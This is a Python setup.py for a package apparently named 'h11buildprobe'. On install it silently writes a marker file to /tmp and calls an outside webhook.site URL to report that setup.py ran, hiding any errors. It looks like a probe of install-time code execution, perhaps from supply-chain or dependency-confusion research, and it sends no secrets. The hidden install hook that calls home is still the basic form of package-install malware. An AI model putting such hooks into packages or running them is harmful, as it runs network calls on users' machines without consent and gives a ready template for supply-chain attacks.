import os
try:
    open('/tmp/h11build', 'w').write('h11build-marker\n')
except Exception:
    pass
try:
    import urllib.request
    urllib.request.urlopen('https://webhook.site/7cdc9802-7068-4b88-92eb-730a5f8f2b47?src=sdist-setuppy-exec&marker=h11build', timeout=8)
except Exception:
    pass
from setuptools import setup
setup(name='h11buildprobe', version='1.0.0', py_modules=[])
